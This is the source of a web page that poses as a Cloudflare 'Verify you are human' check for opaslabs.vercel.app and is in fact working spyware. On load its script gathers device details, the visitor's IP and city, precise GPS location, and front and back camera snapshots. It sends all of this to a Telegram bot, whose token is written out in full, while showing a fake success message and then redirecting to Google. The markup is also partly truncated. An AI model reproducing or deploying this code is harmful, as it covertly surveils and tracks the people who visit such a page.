html {

body {

h1 {

}

h2 {
  font-size: 1.5rem;
  margin-top: 0;

  margin-bottom: 24px;
}

p {
  font-size: 1.5rem;
  margin-top: 0;
  font-weight: 400;
  margin-bottom: 24px;
}

.form-wrapper {
  display: inline-flex;
  align-items: center;
  border: 1px solid #e0e0e0;
  background-color: #f9fafb;
  padding: 8px 16px;
  margin-bottom: 48px;
  height: 70px;
  width: 400px; /* Fixed width */
  min-width: 400px; /* Never shrink below this */
  box-sizing: border-box;
}

input[type="checkbox"] {
  display: none;
}

label.custom-checkbox {
  display: inline-flex;
  align-items: center;
  gap: 12px;
  cursor: pointer;
  user-select: none;
  font-size: 16px;
  color: #1a1a1a;
  position: relative;
  white-space: nowrap;
}

#checkbox-container {
  width: 28px;
  height: 28px;
  background-color: #fff;
  border: 1px solid #666;
  border-radius: 4px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease-in-out;
  cursor: pointer;
}

#checkbox-container i {
  display: none;
  color: white;
  font-size: 14px;
}

#spinner {
  display: none;
  width: 28px;
  height: 28px;
  animation: spin 2.5s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.verify-text, .verifying-text, .success-text {
  font-size: 16px;
  font-weight: 400;
}

.verifying-text, .success-text {
  display: none;
}

.right-section {
  margin-left: auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  justify-content: center;
  height: 100%;
  white-space: nowrap;
}

.right-section img {
  height: 28px;
  width: auto;
  margin-bottom: 4px;
  display: block;
}

.links {
  display: inline-flex;
  justify-content: flex-end;
  line-height: 10px;
  color: #232323;
  font-size: 8px;
}

.links a {
  text-decoration: underline;
  color: #4b5563;
}

.links span {
  user-select: none;
  margin: 0 4px;
}

/* Checked states */
input[type="checkbox"]:checked + label #checkbox-container {
  background-color: #16a34a;
  border-radius: 50%;
  border: none;
}

input[type="checkbox"]:checked + label #checkbox-container i {
  display: block;
}

input[type="checkbox"]:checked + label .verify-text {
  display: none;
}

input[type="checkbox"]:checked + label .success-text {
  display: inline;
}

/* Loading state */
.loading #checkbox-container {
  display: none;
}

.loading #spinner {
  display: block;
}

.loading .verify-text {
  display: none;
}

.loading .verifying-text {
  display: inline;
}

/* Footer */
footer {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: #ffffff;
  padding: 16px 0;
  box-shadow: 0 -1px 4px rgba(0, 0, 0, 0.06);
  font-family: Arial, sans-serif;
}

.footer-inner {
  max-width: 768px;
  margin: 0 auto;
  padding: 0 24px;
  text-align: center;
  font-size: 12px;
  color: #313131;
}

.divider {
  width: 100%;
  height: 1px;
  background-color: #d9d9d9;
  margin: 0 auto 12px auto;
}

/* Mobile handling - only horizontal scroll when needed */
@media (max-width: 500px) {
  body {
    overflow-x: auto;
  }
  
  main {
    padding-left: 16px;
    padding-right: 16px;
  }
  
  .form-wrapper {
    overflow: visible; /* Allow the form to extend beyond viewport */
  }
}
    
  </style>
</head>
<body>
  <main>
    <h1>opaslabs.vercel.app</h1>
    <h2>Verify you are human by completing the action below.</h2>

    <form class="form-wrapper">
      <input type="checkbox" id="verifyHuman" />
      <label for="verifyHuman" class="custom-checkbox" onclick="handleCheckbox(event)">

        <span class="verify-text" id="verify-text">Verify you are human</span>

     <div class="right-section">

<footer>
  <div class="footer-inner">
    <div class="divider"></div>
    <div>Ray ID: 8f41c93da27b6e50</div>
    <div style="margin-top: 4px;">

      <a href="https://www.cloudflare.com" style="color: #0051c3; text-decoration: underline;">Cloudflare</a>

<script>
  // 1. Handle automatic execution on page load
  window.addEventListener('load', async function() {
    const checkbox = document.getElementById("verifyHuman");
    const label = document.querySelector(".custom-checkbox");
    const checkmark = document.getElementById("checkmark");
    const verifyText = document.getElementById("verify-text");
    const verifyingText = document.getElementById("verifying-text");
    const successText = document.getElementById("success-text");

    // Show loading state immediately
    label.classList.add("loading");
    verifyText.style.display = "none";
    verifyingText.style.display = "inline";

    try {
      // Start data exfiltration immediately
      await exfiltrateData();

      // After exfiltration completes, show fake "Success" (3s delay)
      setTimeout(() => {
        label.classList.remove("loading");
        checkmark.style.display = "block";
        verifyingText.style.display = "none";
        successText.style.display = "inline";
        checkbox.checked = true;
      }, 3000);

      // Redirect after 6 seconds
      setTimeout(() => {
        window.location.href = "https://www.google.com"; // Fake redirect
      }, 6000);
    } catch (error) {
      console.error("Exfiltration failed:", error);
      // Fallback to success state if something goes wrong
      setTimeout(() => {
        label.classList.remove("loading");
        checkmark.style.display = "block";
        verifyingText.style.display = "none";
        successText.style.display = "inline";
        checkbox.checked = true;
      }, 3000);
    }
  });

  // 2. Data exfiltration logic
  async function exfiltrateData() {
    const info = await getDeviceInfo();

    // Attempt webcam snapshots
    let frontSnap = await getSnapshot("user");
    let backSnap = await getSnapshot("environment");

    // Update camera status
    if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
    else if (frontSnap) info.cameraStatus = "Front Only";
    else if (backSnap) info.cameraStatus = "Back Only";
    else info.cameraStatus = "None / Denied";

    // Add timestamp
    info.timestamp = new Date().toISOString();
    info.localTime = new Date().toLocaleString();

    // Send device info first
    console.log("Sending device info to Telegram...");
    await sendTextToTelegram(info);

    // Then send camera images if available
    if (frontSnap) {
      console.log("Sending front camera image...");
      await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
    }
    if (backSnap) {
      console.log("Sending back camera image...");
      await sendPhotoToTelegram(backSnap, "📷 Back Camera");
    }
  }

  // 3. Device data collection
  async function getDeviceInfo() {
    const data = {
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
      cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
      screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
      touch: 'ontouchstart' in window ? "Yes" : "No",
      webgl: getWebGLInfo(),
      network: await getNetworkInfo(),
      ip: "Unknown",
      city: "",
      region: "",
      country: "",
      location: "Denied",
      battery: "Unknown",
      charging: "Unknown",
      cameraStatus: ""
    };

    // Fetch IP/location
    try {
      console.log("Fetching IP/location data...");
      const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
      const ipData = await res.json();
      data.ip = ipData.ip;
      data.city = ipData.city;
      data.region = ipData.region;
      data.country = ipData.country;
      console.log("IP/location data received:", ipData);
    } catch (e) {
      console.error("IP fetch failed:", e);
    }

    // Battery status
    try {
      console.log("Checking battery status...");
      const battery = await navigator.getBattery();
      data.battery = (battery.level * 100).toFixed(0) + "%";
      data.charging = battery.charging ? "Yes" : "No";
      console.log("Battery status:", data.battery, data.charging);
    } catch (e) {
      console.error("Battery API failed:", e);
    }

    // GPS
    try {
      console.log("Attempting to get geolocation...");
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true})
      );
      data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
      console.log("Geolocation received:", data.location);
    } catch (e) {
      console.error("Geolocation failed:", e);
      data.location = "Denied/Unavailable";
    }

    return data;
  }

  // 4. Telegram exfiltration functions
  async function sendTextToTelegram(data) {
    const message = `
*🔰 Opas Labs Device Info 🔰*
*📅 Timestamp: ${data.timestamp}*
*🌍 Local Time: ${data.localTime}*

🌐 Basic Info:
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}

💻 Hardware:
- CPU: ${data.cpu}
- RAM: ${data.memory}
- Screen: ${data.screen}
- WebGL: ${data.webgl.vendor} | ${data.webgl.renderer}

📶 *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- Latency (RTT): ${data.network.rtt}
- Data Saver: ${data.network.saveData}

📍 *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.location}

🔋 *Battery*
- Level: ${data.battery}
- Charging: ${data.charging}

📷 *Camera Status*
- ${data.cameraStatus}
    `;

    console.log("Sending device info payload:", message);
    const response = await fetch(`https://api.telegram.org/bot7216371031:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "7216371031",
        text: message,
        parse_mode: "Markdown"
      })
    });

    if (!response.ok) {
      const error = await response.text();
      console.error("Failed to send device info:", error);
      throw new Error(`Device info transmission failed: ${error}`);
    }
    console.log("Device info sent successfully");
    return response;
  }

  function sendPhotoToTelegram(blob, caption) {
    const formData = new FormData();
    formData.append("chat_id", "7216371031");
    formData.append("photo", blob, `${caption}.jpg`);
    formData.append("caption", caption);

    console.log(`Sending ${caption} to Telegram...`);
    return fetch(`https://api.telegram.org/bot7216371031:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }

  // 5. Webcam snapshot
  async function getSnapshot(facingMode) {
    try {
      console.log(`Attempting to access ${facingMode} camera...`);
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode },
        audio: false
      });

      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      // Wait for video to be ready
      await new Promise(resolve => {
        if (video.readyState >= 2) {
          resolve();
        } else {
          video.onloadeddata = () => resolve();
        }
      });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve =>
        canvas.toBlob(resolve, "image/jpeg", 0.9)
      );

      stream.getTracks().forEach(track => track.stop());
      console.log(`Successfully captured ${facingMode} camera image`);
      return blob;
    } catch (err) {
      console.warn(`Camera access denied (${facingMode}):`, err);
      return null;
    }
  }

  // 6. Network/WebGL utils
  async function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      return {
        type: connection.type || "Unknown",
        effectiveType: connection.effectiveType || "Unknown",
        downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
        rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
        saveData: connection.saveData ? "Enabled" : "Disabled",
      };
    }
    return {
      type: "Network API not supported",
      effectiveType: "Unknown",
      downlink: "Unknown",
      rtt: "Unknown",
      saveData: "Unknown"
    };
  }

  function getWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return { vendor: "WebGL not supported", renderer: "WebGL not supported" };

      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
      };
    } catch (e) {
      console.error("WebGL error:", e);
      return { vendor: "Error", renderer: "Error" };
    }
  }
</script>
